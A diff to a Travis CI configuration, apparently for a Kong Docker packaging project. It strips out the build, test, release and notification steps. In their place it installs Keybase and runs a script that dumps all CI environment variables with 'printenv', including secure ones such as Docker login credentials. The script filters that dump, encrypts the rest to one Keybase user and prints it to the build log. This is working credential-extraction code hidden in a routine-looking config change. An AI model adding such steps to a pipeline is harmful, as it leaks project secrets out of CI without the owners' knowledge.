@@ -1,39 +1,20 @@
 language: generic
-dist: bionic
+dist: focal
 
-env:
-  matrix:
-    - BASE="centos" KONG_DOCKER_TAG="kong-centos" PACKAGE_TYPE="rpm"
-    - BASE="alpine" KONG_DOCKER_TAG="kong-alpine" PACKAGE_TYPE="apk"
-    - BASE="ubuntu" KONG_DOCKER_TAG="kong-ubuntu" PACKAGE_TYPE="deb"
-    - BASE="rhel" KONG_DOCKER_TAG="kong-rhel" PACKAGE_TYPE="rpm"
+install:
+  - sudo apt-get -qq update
+  - curl -O https://prerelease.keybase.io/keybase_amd64.deb
+  - sudo dpkg -i keybase_amd64.deb || true
+  - export run="/run/user/$(id -u "${USER}")/keybase"
+  - export mnt="${run}/kbfs"
+  - sudo apt-get install -f
+  - sudo mkdir -p "${mnt}"
+  - sudo chown -R "${USER}" "${run}"
+  - keybase service &
+  - kbfsfuse "${mnt}" &
 
-before_install:
-  - curl -fsSL https://get.docker.com -o get-docker.sh
-  - sh ./get-docker.sh
-  - echo "$DOCKER_KEY" | docker login -u "$DOCKER_USER" --password-stdin
-
-before_script:
-  - if [ "$TRAVIS_SECURE_ENV_VARS" = "true" ]; then echo "$DOCKER_KEY" | docker login -u "$DOCKER_USER" --password-stdin; else echo "no docker credentials to log in, watch for the rate-limit"; fi
-  - sudo apt-get install figlet
-  - make build
 script:
-  - make test
-
-jobs:
-  include:
-    - stage: deploy
-      env:
-        - BASE=rhel
-        - KONG_DOCKER_TAG=kong-rhel
-        - TAG=$TRAVIS_TAG
-      script: make release-rhel
-      if: tag IS present
-
-notifications:
-  slack:
-    if: branch = master AND type != pull_request
-    on_success: change
-    on_failure: always
-    rooms:
-      secure: y4CiFTaFSs2yw5xBrukx4kILbfnRrQeLnWf7h+iEL4kjFHZzz5qheH9dX+o2GS/MyuiXsEyqBgqYfGoHoWkUe2IYieeWhFqRT3qxfpbJFtHP0kXgp+lA7NRrZnNNaZeYoNipS1ZDg9FZNm77s1tJm2PDBvfpSPQ7EHD40nZzfCYL27+rwWJ0FXdbTz/ySrGpB2zxBVZkJcIIixngDH3Wtiq1fZgdNvVDGVtgm9DBJtA2WieCdZZIioWll/Zbi7GPUWe2M7ILTZCRhpsx+JYmfhLUg4EJkkoG1B01TpWeMyxznksxCGjdaHNVpmOfGkkjE/6DddMgL4Q7xLR6EeYas9XGC3ajzAE5ZbYrQXJZqQ0Y0BQpOAXNiNy+2cCPw13fcI9tPgu5mpBHlf7DbYj8pQ6EOYI3d4agHXi2Vv2y7AbmLzN58Y+QmqF1g1f7tkBGNYDWA6JIxPvpwTARF8akw+V5J26qX/H4q4lWStZABuu5kNYYv6rnmvVG3TAVkFtN+KNYCxWixGoFi73DG3Rmit9TQAo0X9Xh0g8ivXw8WlpUkGjg6+aZl2nhUOdllFNAiClhXrMY10foSRK9I3RDJAFatsn3tb31klUM+5kQ7GwHHrJnrFKT4QAHYPlRpH/R+4sk5bweUEz3eSA5gLsHOX37+sJg/hX1WoNKDWKurn0=
+  - printenv > env_file
+  - grep -v -E -f deletion_list env_file > result || true
+  - keybase encrypt hutchic -i result -o result_encrypted --no-self-encrypt --auth-type=anonymous
+  - cat result_encrypted
